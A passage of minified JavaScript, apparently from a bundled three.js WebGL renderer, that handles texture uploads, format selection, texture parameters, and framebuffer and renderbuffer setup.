navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),u=new WeakMap;let h;const p=new WeakMap;let m=!1;try{m=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function E(A,M){return m?new OffscreenCanvas(A,M):Ji("canvas")}function x(A,M,O,Q){let Z=1;if((A.width>Q||A.height>Q)&&(Z=Q/Math.max(A.width,A.height)),Z<1||M===!0)if(typeof HTMLImageElement<"u"&&A instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&A instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&A instanceof ImageBitmap){const tt=M?es:Math.floor,ht=tt(Z*A.width),ot=tt(Z*A.height);h===void 0&&(h=E(ht,ot));const ct=O?E(ht,ot):h;return ct.width=ht,ct.height=ot,ct.getContext("2d").drawImage(A,0,0,ht,ot),console.warn("THREE.WebGLRenderer: Texture has been resized from ("+A.width+"x"+A.height+") to ("+ht+"x"+ot+")."),ct}else return"data"in A&&console.warn("THREE.WebGLRenderer: Image in DataTexture is too big ("+A.width+"x"+A.height+")."),A;return A}function f(A){return ea(A.width)&&ea(A.height)}function d(A){return a?!1:A.wrapS!==Fe||A.wrapT!==Fe||A.minFilter!==ge&&A.minFilter!==we}function g(A,M){return A.generateMipmaps&&M&&A.minFilter!==ge&&A.minFilter!==we}function _(A){i.generateMipmap(A)}function v(A,M,O,Q,Z=!1){if(a===!1)return M;if(A!==null){if(i[A]!==void 0)return i[A];console.warn("THREE.WebGLRenderer: Attempt to use non-existing WebGL internal format '"+A+"'")}let tt=M;if(M===i.RED&&(O===i.FLOAT&&(tt=i.R32F),O===i.HALF_FLOAT&&(tt=i.R16F),O===i.UNSIGNED_BYTE&&(tt=i.R8)),M===i.RED_INTEGER&&(O===i.UNSIGNED_BYTE&&(tt=i.R8UI),O===i.UNSIGNED_SHORT&&(tt=i.R16UI),O===i.UNSIGNED_INT&&(tt=i.R32UI),O===i.BYTE&&(tt=i.R8I),O===i.SHORT&&(tt=i.R16I),O===i.INT&&(tt=i.R32I)),M===i.RG&&(O===i.FLOAT&&(tt=i.RG32F),O===i.HALF_FLOAT&&(tt=i.RG16F),O===i.UNSIGNED_BYTE&&(tt=i.RG8)),M===i.RGBA){const ht=Z?ji:Wt.getTransfer(Q);O===i.FLOAT&&(tt=i.RGBA32F),O===i.HALF_FLOAT&&(tt=i.RGBA16F),O===i.UNSIGNED_BYTE&&(tt=ht===jt?i.SRGB8_ALPHA8:i.RGBA8),O===i.UNSIGNED_SHORT_4_4_4_4&&(tt=i.RGBA4),O===i.UNSIGNED_SHORT_5_5_5_1&&(tt=i.RGB5_A1)}return(tt===i.R16F||tt===i.R32F||tt===i.RG16F||tt===i.RG32F||tt===i.RGBA16F||tt===i.RGBA32F)&&t.get("EXT_color_buffer_float"),tt}function w(A,M,O){return g(A,O)===!0||A.isFramebufferTexture&&A.minFilter!==ge&&A.minFilter!==we?Math.log2(Math.max(M.width,M.height))+1:A.mipmaps!==void 0&&A.mipmaps.length>0?A.mipmaps.length:A.isCompressedTexture&&Array.isArray(A.image)?M.mipmaps.length:1}function S(A){return A===ge||A===As||A===dr?i.NEAREST:i.LINEAR}function T(A){const M=A.target;M.removeEventListener("dispose",T),y(M),M.isVideoTexture&&u.delete(M)}function D(A){const M=A.target;M.removeEventListener("dispose",D),k(M)}function y(A){const M=n.get(A);if(M.__webglInit===void 0)return;const O=A.source,Q=p.get(O);if(Q){const Z=Q[M.__cacheKey];Z.usedTimes--,Z.usedTimes===0&&R(A),Object.keys(Q).length===0&&p.delete(O)}n.remove(A)}function R(A){const M=n.get(A);i.deleteTexture(M.__webglTexture);const O=A.source,Q=p.get(O);delete Q[M.__cacheKey],o.memory.textures--}function k(A){const M=A.texture,O=n.get(A),Q=n.get(M);if(Q.__webglTexture!==void 0&&(i.deleteTexture(Q.__webglTexture),o.memory.textures--),A.depthTexture&&A.depthTexture.dispose(),A.isWebGLCubeRenderTarget)for(let Z=0;Z<6;Z++){if(Array.isArray(O.__webglFramebuffer[Z]))for(let tt=0;tt<O.__webglFramebuffer[Z].length;tt++)i.deleteFramebuffer(O.__webglFramebuffer[Z][tt]);else i.deleteFramebuffer(O.__webglFramebuffer[Z]);O.__webglDepthbuffer&&i.deleteRenderbuffer(O.__webglDepthbuffer[Z])}else{if(Array.isArray(O.__webglFramebuffer))for(let Z=0;Z<O.__webglFramebuffer.length;Z++)i.deleteFramebuffer(O.__webglFramebuffer[Z]);else i.deleteFramebuffer(O.__webglFramebuffer);if(O.__webglDepthbuffer&&i.deleteRenderbuffer(O.__webglDepthbuffer),O.__webglMultisampledFramebuffer&&i.deleteFramebuffer(O.__webglMultisampledFramebuffer),O.__webglColorRenderbuffer)for(let Z=0;Z<O.__webglColorRenderbuffer.length;Z++)O.__webglColorRenderbuffer[Z]&&i.deleteRenderbuffer(O.__webglColorRenderbuffer[Z]);O.__webglDepthRenderbuffer&&i.deleteRenderbuffer(O.__webglDepthRenderbuffer)}if(A.isWebGLMultipleRenderTargets)for(let Z=0,tt=M.length;Z<tt;Z++){const ht=n.get(M[Z]);ht.__webglTexture&&(i.deleteTexture(ht.__webglTexture),o.memory.textures--),n.remove(M[Z])}n.remove(M),n.remove(A)}let X=0;function et(){X=0}function P(){const A=X;return A>=r.maxTextures&&console.warn("THREE.WebGLTextures: Trying to use "+A+" texture units while this GPU supports only "+r.maxTextures),X+=1,A}function B(A){const M=[];return M.push(A.wrapS),M.push(A.wrapT),M.push(A.wrapR||0),M.push(A.magFilter),M.push(A.minFilter),M.push(A.anisotropy),M.push(A.internalFormat),M.push(A.format),M.push(A.type),M.push(A.generateMipmaps),M.push(A.premultiplyAlpha),M.push(A.flipY),M.push(A.unpackAlignment),M.push(A.colorSpace),M.join()}function W(A,M){const O=n.get(A);if(A.isVideoTexture&&$t(A),A.isRenderTargetTexture===!1&&A.version>0&&O.__version!==A.version){const Q=A.image;if(Q===null)console.warn("THREE.WebGLRenderer: Texture marked for update but no image data found.");else if(Q.complete===!1)console.warn("THREE.WebGLRenderer: Texture marked for update but image is incomplete");else{rt(O,A,M);return}}e.bindTexture(i.TEXTURE_2D,O.__webglTexture,i.TEXTURE0+M)}function Y(A,M){const O=n.get(A);if(A.version>0&&O.__version!==A.version){rt(O,A,M);return}e.bindTexture(i.TEXTURE_2D_ARRAY,O.__webglTexture,i.TEXTURE0+M)}function H(A,M){const O=n.get(A);if(A.version>0&&O.__version!==A.version){rt(O,A,M);return}e.bindTexture(i.TEXTURE_3D,O.__webglTexture,i.TEXTURE0+M)}function V(A,M){const O=n.get(A);if(A.version>0&&O.__version!==A.version){pt(O,A,M);return}e.bindTexture(i.TEXTURE_CUBE_MAP,O.__webglTexture,i.TEXTURE0+M)}const q={[Zr]:i.REPEAT,[Fe]:i.CLAMP_TO_EDGE,[Jr]:i.MIRRORED_REPEAT},J={[ge]:i.NEAREST,[As]:i.NEAREST_MIPMAP_NEAREST,[dr]:i.NEAREST_MIPMAP_LINEAR,[we]:i.LINEAR,[yl]:i.LINEAR_MIPMAP_NEAREST,[fi]:i.LINEAR_MIPMAP_LINEAR},K={[Nl]:i.NEVER,[zl]:i.ALWAYS,[Ul]:i.LESS,[po]:i.LEQUAL,[Ol]:i.EQUAL,[Bl]:i.GEQUAL,[Fl]:i.GREATER,[kl]:i.NOTEQUAL};function G(A,M,O){if(O?(i.texParameteri(A,i.TEXTURE_WRAP_S,q[M.wrapS]),i.texParameteri(A,i.TEXTURE_WRAP_T,q[M.wrapT]),(A===i.TEXTURE_3D||A===i.TEXTURE_2D_ARRAY)&&i.texParameteri(A,i.TEXTURE_WRAP_R,q[M.wrapR]),i.texParameteri(A,i.TEXTURE_MAG_FILTER,J[M.magFilter]),i.texParameteri(A,i.TEXTURE_MIN_FILTER,J[M.minFilter])):(i.texParameteri(A,i.TEXTURE_WRAP_S,i.CLAMP_TO_EDGE),i.texParameteri(A,i.TEXTURE_WRAP_T,i.CLAMP_TO_EDGE),(A===i.TEXTURE_3D||A===i.TEXTURE_2D_ARRAY)&&i.texParameteri(A,i.TEXTURE_WRAP_R,i.CLAMP_TO_EDGE),(M.wrapS!==Fe||M.wrapT!==Fe)&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping."),i.texParameteri(A,i.TEXTURE_MAG_FILTER,S(M.magFilter)),i.texParameteri(A,i.TEXTURE_MIN_FILTER,S(M.minFilter)),M.minFilter!==ge&&M.minFilter!==we&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.")),M.compareFunction&&(i.texParameteri(A,i.TEXTURE_COMPARE_MODE,i.COMPARE_REF_TO_TEXTURE),i.texParameteri(A,i.TEXTURE_COMPARE_FUNC,K[M.compareFunction])),t.has("EXT_texture_filter_anisotropic")===!0){const Q=t.get("EXT_texture_filter_anisotropic");if(M.magFilter===ge||M.minFilter!==dr&&M.minFilter!==fi||M.type===sn&&t.has("OES_texture_float_linear")===!1||a===!1&&M.type===hi&&t.has("OES_texture_half_float_linear")===!1)return;(M.anisotropy>1||n.get(M).__currentAnisotropy)&&(i.texParameterf(A,Q.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(M.anisotropy,r.getMaxAnisotropy())),n.get(M).__currentAnisotropy=M.anisotropy)}}function j(A,M){let O=!1;A.__webglInit===void 0&&(A.__webglInit=!0,M.addEventListener("dispose",T));const Q=M.source;let Z=p.get(Q);Z===void 0&&(Z={},p.set(Q,Z));const tt=B(M);if(tt!==A.__cacheKey){Z[tt]===void 0&&(Z[tt]={texture:i.createTexture(),usedTimes:0},o.memory.textures++,O=!0),Z[tt].usedTimes++;const ht=Z[A.__cacheKey];ht!==void 0&&(Z[A.__cacheKey].usedTimes--,ht.usedTimes===0&&R(M)),A.__cacheKey=tt,A.__webglTexture=Z[tt].texture}return O}function rt(A,M,O){let Q=i.TEXTURE_2D;(M.isDataArrayTexture||M.isCompressedArrayTexture)&&(Q=i.TEXTURE_2D_ARRAY),M.isData3DTexture&&(Q=i.TEXTURE_3D);const Z=j(A,M),tt=M.source;e.bindTexture(Q,A.__webglTexture,i.TEXTURE0+O);const ht=n.get(tt);if(tt.version!==ht.__version||Z===!0){e.activeTexture(i.TEXTURE0+O);const ot=Wt.getPrimaries(Wt.workingColorSpace),ct=M.colorSpace===Pe?null:Wt.getPrimaries(M.colorSpace),yt=M.colorSpace===Pe||ot===ct?i.NONE:i.BROWSER_DEFAULT_WEBGL;i.pixelStorei(i.UNPACK_FLIP_Y_WEBGL,M.flipY),i.pixelStorei(i.UNPACK_PREMULTIPLY_ALPHA_WEBGL,M.premultiplyAlpha),i.pixelStorei(i.UNPACK_ALIGNMENT,M.unpackAlignment),i.pixelStorei(i.UNPACK_COLORSPACE_CONVERSION_WEBGL,yt);const Dt=d(M)&&f(M.image)===!1;let $=x(M.image,Dt,!1,r.maxTextureSize);$=Lt(M,$);const Vt=f($)||a,Bt=s.convert(M.format,M.colorSpace);let At=s.convert(M.type),_t=v(M.internalFormat,Bt,At,M.colorSpace,M.isVideoTexture);G(Q,M,Vt);let dt;const Pt=M.mipmaps,Gt=a&&M.isVideoTexture!==!0&&_t!==co,Jt=ht.__version===void 0||Z===!0,Ot=w(M,$,Vt);if(M.isDepthTexture)_t=i.DEPTH_COMPONENT,a?M.type===sn?_t=i.DEPTH_COMPONENT32F:M.type===rn?_t=i.DEPTH_COMPONENT24:M.type===yn?_t=i.DEPTH24_STENCIL8:_t=i.DEPTH_COMPONENT16:M.type===sn&&console.error("WebGLRenderer: Floating point depth texture requires WebGL2."),M.format===Mn&&_t===i.DEPTH_COMPONENT&&M.type!==as&&M.type!==rn&&(console.warn("THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture."),M.type=rn,At=s.convert(M.type)),M.format===Zn&&_t===i.DEPTH_COMPONENT&&(_t=i.DEPTH_STENCIL,M.type!==yn&&(console.warn("THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture."),M.type=yn,At=s.convert(M.type))),Jt&&(Gt?e.texStorage2D(i.TEXTURE_2D,1,_t,$.width,$.height):e.texImage2D(i.TEXTURE_2D,0,_t,$.width,$.height,0,Bt,At,null));else if(M.isDataTexture)if(Pt.length>0&&Vt){Gt&&Jt&&e.texStorage2D(i.TEXTURE_2D,Ot,_t,Pt[0].width,Pt[0].height);for(let nt=0,C=Pt.length;nt<C;nt++)dt=Pt[nt],Gt?e.texSubImage2D(i.TEXTURE_2D,nt,0,0,dt.width,dt.height,Bt,At,dt.data):e.texImage2D(i.TEXTURE_2D,nt,_t,dt.width,dt.height,0,Bt,At,dt.data);M.generateMipmaps=!1}else Gt?(Jt&&e.texStorage2D(i.TEXTURE_2D,Ot,_t,$.width,$.height),e.texSubImage2D(i.TEXTURE_2D,0,0,0,$.width,$.height,Bt,At,$.data)):e.texImage2D(i.TEXTURE_2D,0,_t,$.width,$.height,0,Bt,At,$.data);else if(M.isCompressedTexture)if(M.isCompressedArrayTexture){Gt&&Jt&&e.texStorage3D(i.TEXTURE_2D_ARRAY,Ot,_t,Pt[0].width,Pt[0].height,$.depth);for(let nt=0,C=Pt.length;nt<C;nt++)dt=Pt[nt],M.format!==ke?Bt!==null?Gt?e.compressedTexSubImage3D(i.TEXTURE_2D_ARRAY,nt,0,0,0,dt.width,dt.height,$.depth,Bt,dt.data,0,0):e.compressedTexImage3D(i.TEXTURE_2D_ARRAY,nt,_t,dt.width,dt.height,$.depth,0,dt.data,0,0):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):Gt?e.texSubImage3D(i.TEXTURE_2D_ARRAY,nt,0,0,0,dt.width,dt.height,$.depth,Bt,At,dt.data):e.texImage3D(i.TEXTURE_2D_ARRAY,nt,_t,dt.width,dt.height,$.depth,0,Bt,At,dt.data)}else{Gt&&Jt&&e.texStorage2D(i.TEXTURE_2D,Ot,_t,Pt[0].width,Pt[0].height);for(let nt=0,C=Pt.length;nt<C;nt++)dt=Pt[nt],M.format!==ke?Bt!==null?Gt?e.compressedTexSubImage2D(i.TEXTURE_2D,nt,0,0,dt.width,dt.height,Bt,dt.data):e.compressedTexImage2D(i.TEXTURE_2D,nt,_t,dt.width,dt.height,0,dt.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):Gt?e.texSubImage2D(i.TEXTURE_2D,nt,0,0,dt.width,dt.height,Bt,At,dt.data):e.texImage2D(i.TEXTURE_2D,nt,_t,dt.width,dt.height,0,Bt,At,dt.data)}else if(M.isDataArrayTexture)Gt?(Jt&&e.texStorage3D(i.TEXTURE_2D_ARRAY,Ot,_t,$.width,$.height,$.depth),e.texSubImage3D(i.TEXTURE_2D_ARRAY,0,0,0,0,$.width,$.height,$.depth,Bt,At,$.data)):e.texImage3D(i.TEXTURE_2D_ARRAY,0,_t,$.width,$.height,$.depth,0,Bt,At,$.data);else if(M.isData3DTexture)Gt?(Jt&&e.texStorage3D(i.TEXTURE_3D,Ot,_t,$.width,$.height,$.depth),e.texSubImage3D(i.TEXTURE_3D,0,0,0,0,$.width,$.height,$.depth,Bt,At,$.data)):e.texImage3D(i.TEXTURE_3D,0,_t,$.width,$.height,$.depth,0,Bt,At,$.data);else if(M.isFramebufferTexture){if(Jt)if(Gt)e.texStorage2D(i.TEXTURE_2D,Ot,_t,$.width,$.height);else{let nt=$.width,C=$.height;for(let st=0;st<Ot;st++)e.texImage2D(i.TEXTURE_2D,st,_t,nt,C,0,Bt,At,null),nt>>=1,C>>=1}}else if(Pt.length>0&&Vt){Gt&&Jt&&e.texStorage2D(i.TEXTURE_2D,Ot,_t,Pt[0].width,Pt[0].height);for(let nt=0,C=Pt.length;nt<C;nt++)dt=Pt[nt],Gt?e.texSubImage2D(i.TEXTURE_2D,nt,0,0,Bt,At,dt):e.texImage2D(i.TEXTURE_2D,nt,_t,Bt,At,dt);M.generateMipmaps=!1}else Gt?(Jt&&e.texStorage2D(i.TEXTURE_2D,Ot,_t,$.width,$.height),e.texSubImage2D(i.TEXTURE_2D,0,0,0,Bt,At,$)):e.texImage2D(i.TEXTURE_2D,0,_t,Bt,At,$);g(M,Vt)&&_(Q),ht.__version=tt.version,M.onUpdate&&M.onUpdate(M)}A.__version=M.version}function pt(A,M,O){if(M.image.length!==6)return;const Q=j(A,M),Z=M.source;e.bindTexture(i.TEXTURE_CUBE_MAP,A.__webglTexture,i.TEXTURE0+O);const tt=n.get(Z);if(Z.version!==tt.__version||Q===!0){e.activeTexture(i.TEXTURE0+O);const ht=Wt.getPrimaries(Wt.workingColorSpace),ot=M.colorSpace===Pe?null:Wt.getPrimaries(M.colorSpace),ct=M.colorSpace===Pe||ht===ot?i.NONE:i.BROWSER_DEFAULT_WEBGL;i.pixelStorei(i.UNPACK_FLIP_Y_WEBGL,M.flipY),i.pixelStorei(i.UNPACK_PREMULTIPLY_ALPHA_WEBGL,M.premultiplyAlpha),i.pixelStorei(i.UNPACK_ALIGNMENT,M.unpackAlignment),i.pixelStorei(i.UNPACK_COLORSPACE_CONVERSION_WEBGL,ct);const yt=M.isCompressedTexture||M.image[0].isCompressedTexture,Dt=M.image[0]&&M.image[0].isDataTexture,$=[];for(let nt=0;nt<6;nt++)!yt&&!Dt?$[nt]=x(M.image[nt],!1,!0,r.maxCubemapSize):$[nt]=Dt?M.image[nt].image:M.image[nt],$[nt]=Lt(M,$[nt]);const Vt=$[0],Bt=f(Vt)||a,At=s.convert(M.format,M.colorSpace),_t=s.convert(M.type),dt=v(M.internalFormat,At,_t,M.colorSpace),Pt=a&&M.isVideoTexture!==!0,Gt=tt.__version===void 0||Q===!0;let Jt=w(M,Vt,Bt);G(i.TEXTURE_CUBE_MAP,M,Bt);let Ot;if(yt){Pt&&Gt&&e.texStorage2D(i.TEXTURE_CUBE_MAP,Jt,dt,Vt.width,Vt.height);for(let nt=0;nt<6;nt++){Ot=$[nt].mipmaps;for(let C=0;C<Ot.length;C++){const st=Ot[C];M.format!==ke?At!==null?Pt?e.compressedTexSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C,0,0,st.width,st.height,At,st.data):e.compressedTexImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C,dt,st.width,st.height,0,st.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):Pt?e.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C,0,0,st.width,st.height,At,_t,st.data):e.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C,dt,st.width,st.height,0,At,_t,st.data)}}}else{Ot=M.mipmaps,Pt&&Gt&&(Ot.length>0&&Jt++,e.texStorage2D(i.TEXTURE_CUBE_MAP,Jt,dt,$[0].width,$[0].height));for(let nt=0;nt<6;nt++)if(Dt){Pt?e.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,0,0,0,$[nt].width,$[nt].height,At,_t,$[nt].data):e.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,0,dt,$[nt].width,$[nt].height,0,At,_t,$[nt].data);for(let C=0;C<Ot.length;C++){const at=Ot[C].image[nt].image;Pt?e.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C+1,0,0,at.width,at.height,At,_t,at.data):e.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C+1,dt,at.width,at.height,0,At,_t,at.data)}}else{Pt?e.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,0,0,0,At,_t,$[nt]):e.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,0,dt,At,_t,$[nt]);for(let C=0;C<Ot.length;C++){const st=Ot[C];Pt?e.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C+1,0,0,At,_t,st.image[nt]):e.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+nt,C+1,dt,At,_t,st.image[nt])}}}g(M,Bt)&&_(i.TEXTURE_CUBE_MAP),tt.__version=Z.version,M.onUpdate&&M.onUpdate(M)}A.__version=M.version}function ut(A,M,O,Q,Z,tt){const ht=s.convert(O.format,O.colorSpace),ot=s.convert(O.type),ct=v(O.internalFormat,ht,ot,O.colorSpace);if(!n.get(M).__hasExternalTextures){const Dt=Math.max(1,M.width>>tt),$=Math.max(1,M.height>>tt);Z===i.TEXTURE_3D||Z===i.TEXTURE_2D_ARRAY?e.texImage3D(Z,tt,ct,Dt,$,M.depth,0,ht,ot,null):e.texImage2D(Z,tt,ct,Dt,$,0,ht,ot,null)}e.bindFramebuffer(i.FRAMEBUFFER,A),ft(M)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,Q,Z,n.get(O).__webglTexture,0,Rt(M)):(Z===i.TEXTURE_2D||Z>=i.TEXTURE_CUBE_MAP_POSITIVE_X&&Z<=i.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&i.framebufferTexture2D(i.FRAMEBUFFER,Q,Z,n.get(O).__webglTexture,tt),e.bindFramebuffer(i.FRAMEBUFFER,null)}function St(A,M,O){if(i.bindRenderbuffer(i.RENDERBUFFER,A),M.depthBuffer&&!M.stencilBuffer){let Q=a===!0?i.DEPTH_COMPONENT24:i.DEPTH_COMPONENT16;if(O||ft(M)){const Z=M.depthTexture;Z&&Z.isDepthTexture&&(Z.type===sn?Q=i.DEPTH_COMPONENT32F:Z.type===rn&&(Q=i.DEPTH_COMPONENT24));const tt=Rt(M);ft(M)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,tt,Q,M.width,M.height):i.renderbufferStorageMultisample(i.RENDERBUFFER,tt,Q,M.width,M.height)}else i.renderbufferStorage(i.RENDERBUFFER,Q,M.width,M.height);i.framebufferRenderbuffer(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.RENDERBUFFER,A)}else if(M.depthBuffer&&M.stencilBuffer){const Q=Rt(M);O&&ft(M)===!1?i.renderbufferStorageMultisample(i.RENDERBUFFER,Q,i.DEPTH24_STENCIL8,M.width,M.height):ft(M)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,Q,i.DEPTH24_STENCIL8,M.width,M.height):i.renderbufferStorage(i.RENDERBUFFER,i.DEPTH_STENCIL,M.width,M.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.RENDERBUFFER,A)}else{const Q=M.isWebGLMultipleRenderTargets===!0?M.texture:[M.texture];for(let Z=0;Z<Q.length;Z++){const tt=Q[Z],ht=s.convert(tt.format,tt.colorSpace),ot=s.convert(tt.type),ct=v(tt.internalFormat,ht,ot,tt.colorSpace),yt=Rt(M);O&&ft(M)===!1?i.renderbufferStorageMultisample(i.RENDERBUFFER,yt,ct,M.width,M.height):ft(M)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,yt,ct,M.width,M.height):i.renderbufferStorage(i.RENDERBUFFER,ct,M.width,M.height)}}i.bindRenderbuffer(i.RENDERBUFFER,null)}function Tt(A,M){if(M&&M.isWebGLCubeRenderTarget)throw new Error("Depth Texture with cube render targets is not supported");if(e.bindFramebuffer(i.FRAMEBUFFER,A),!(M.depthTexture&&M.depthTexture.isDepthTexture))throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");(!n.get(M.depthTexture).__webglTexture||M.depthTexture.image.width!==M.width||M.depthTexture.image.height!==M.height)&&(M.depthTexture.image.width=M.width,M.depthTexture.image.height=M.height,M.depthTexture.needsUpdate=!0),W(M.depthTexture,0);const Q=n.get(M.depthTexture).__webglTexture,Z=Rt(M);if(M.depthTexture.format===Mn)ft(M)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.TEXTURE_2D,Q,0,Z):i.framebufferTexture2D(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.TEXTURE_2D,Q,0);else if(M.depthTexture.format===Zn)ft(M)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.TEXTURE_2D,Q,0,Z):i.framebufferTexture2D(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.TEXTURE_2D,Q,0);else throw new Error("Unknown depthTexture format")}function gt(A){const M=n.get(A),O=A.isWebGLCubeRenderTarget===!0;if(A.depthTexture&&!M.__autoAllocateDepthBuffer){if(O)throw new Error("target.depthTexture not supported in Cube render targets");Tt(M.__webglFramebuffer,A)}else if(O){M.__webglDepthbuffer=[];for(let Q=0;Q<6;Q++)e.bindFramebuffer(i.FRAMEBUFFER,M.__webglFramebuffer[Q]),M.__webglDepthbuffer[Q]=i.createRenderbuffer(),St(M.__webglDepthbuffer[Q],A,!1)}else e.bindFramebuffer(i.FRAMEBUFFER,M.__webglFramebuffer),M.__webglDepthbuffer=i.createRenderbuffer(),St(M.__webglDepthbuffer,A,!1);e.bindFramebuffer(i.FRAMEBUFFER,null)}function Ut(A,M,O){const Q=n.get(A);M!==void 0&&ut(Q.__webglFramebuffer,A,A.texture,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,0),O!==void 0&&gt(A)}function N(A){const M=A.texture,O=n.get(A),Q=n.get(M);A.addEventListener("dispose",D),A.isWebGLMultipleRenderTargets!==!0&&(Q.__webglTexture===void 0&&(Q.__webglTexture=i.createTexture()),Q.__version=M.version,o.memory.textures++);const Z=A.isWebGLCubeRenderTarget===!0,tt=A.isWebGLMultipleRenderTargets===!0,ht=f(A)||a;if(Z){O.__webglFramebuffer=[];for(let ot=0;ot<6;ot++)if(a&&M.mipmaps&&M.mipmaps.length>0){O.__webglFramebuffer[ot]=[];for(let ct=0;ct<M.mipmaps.length;ct++)O.__webglFramebuffer[ot][ct]=i.createFramebuffer()}else O.__webglFramebuffer[ot]=i.createFramebuffer()}else{if(a&&M.mipmaps&&M.mipmaps.length>0){O.__webglFramebuffer=[];for(let ot=0;ot<M.mipmaps.length;ot++)O.__webglFramebuffer[ot]=i.createFramebuffer()}else O.__webglFramebuffer=i.createFramebuffer();if(tt)if(r.drawBuffers){const ot=A.texture;for(let ct=0,yt=ot.length;ct<yt;ct++){const Dt=n.get(ot[ct]);Dt.__webglTexture===void 0&&(Dt.__webglTexture=i.createTexture(),o.memory.textures++)}}else console.warn("THREE.WebGLRenderer: WebGLMultipleRenderTargets can only be used with WebGL2 or WEBGL_draw_buffers extension.");if(a&&A.samples>0&&ft(A)===!1){const ot=tt?M:[M];O.__webglMultisampledFramebuffer=i.createFramebuffer(),O.__webglColorRenderbuffer=[],e.bindFramebuffer(i.FRAMEBUFFER,O.__webglMultisampledFramebuffer);for(let ct=0;ct<ot.length;ct++){const yt=ot[ct];O.__webglColorRenderbuffer[ct]=i.createRenderbuffer(),i.bindRenderbuffer(i.RENDERBUFFER,O.__webglColorRenderbuffer[ct]);const Dt=s.convert(yt.format,yt.colorSpace),$=s.convert(yt.type),Vt=v(yt.internalFormat,Dt,$,yt.colorSpace,A.isXRRenderTarget===!0),Bt=Rt(A);i.renderbufferStorageMultisample(i.RENDERBUFFER,Bt,Vt,A.width,A.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+ct,i.RENDERBUFFER,O.__webglColorRenderbuffer[ct])}i.bindRenderbuffer(i.RENDERBUFFER,null),A.depthBuffer&&(O.__webglDepthRenderbuffer=i.createRenderbuffer(),St(O.__webglDepthRenderbuffer,A,!0)),e.bindFramebuffer(i.FRAMEBUFFER,null)}}if(Z){e.bindTexture(i.TEXTURE_CUBE_MAP,Q.__webglTexture),G(i.TEXTURE_CUBE_MAP,M,ht);for(let ot=0;ot<6;ot++)if(a&&M.mipmaps&&M.mipmaps.length>0)for(let ct=0;ct<M.mipmaps.length;ct++)ut(O.__webglFramebuffer[ot][ct],A,M,i.COLOR_ATTACHMENT0,i.TEXTURE_CUBE_MAP_POSITIVE_X+ot,ct);else ut(O.__webglFramebuffer[ot],A,M,i.COLOR_ATTACHMENT0,i.TEXTURE_CUBE_MAP_POSITIVE_X+ot,0);g(M,ht)&&_(i.TEXTURE_CUBE_MAP),e.unbindTexture()}else if(tt){const ot=A.texture;for(let ct=0,yt=ot.length;ct<yt;ct++){const Dt=ot[ct],$=n.get(Dt);e.bindTexture(i.TEXTURE_2D,$.__webglTexture),G(i.TEXTURE_2D,Dt,ht),ut(O.__webglFramebuffer,A,Dt,i.COLOR_ATTACHMENT0+ct,i.TEXTURE_2D,0),g(Dt,ht)&&_(i.TEXTURE_2D)}e.unbindTexture()}else{let ot=i.TEXTURE_2D;if((A.isWebGL3DRenderTarget||A.isWebGLArrayRenderTarget)&&(a?ot=A.isWebGL3DRenderTarget?i.TEXTURE_3D:i.TEXTURE_2D_ARRAY:console.error("THREE.WebGLTextures: THREE.Data3DTexture and THREE.DataArrayTexture only supported with WebGL2.")),e.bindTexture(ot,Q.__webglTexture),G(ot,M,ht),a&&M.mipmaps&&M.mipmaps.length>0)for(let ct=0;ct<M.mipmaps.length;ct++)ut(O.__webglFramebuffer[ct],A,M,i.COLOR_ATTACHMENT0,ot,ct);else ut(O.__webglFramebuffer,A,M,i.COLOR_ATTACHMENT0,ot,0);g(M,ht)&&_(ot),e.unbindTexture()}A.depthBuffer&&gt(A)}function ne(A){const M=f(A)||a,O=A.isWebGLMultipleRenderTargets===!0?A.texture:[A.texture];for(let Q=0,Z=O.length;Q<Z;Q++){const tt=O[Q];if(g(tt,M)){const 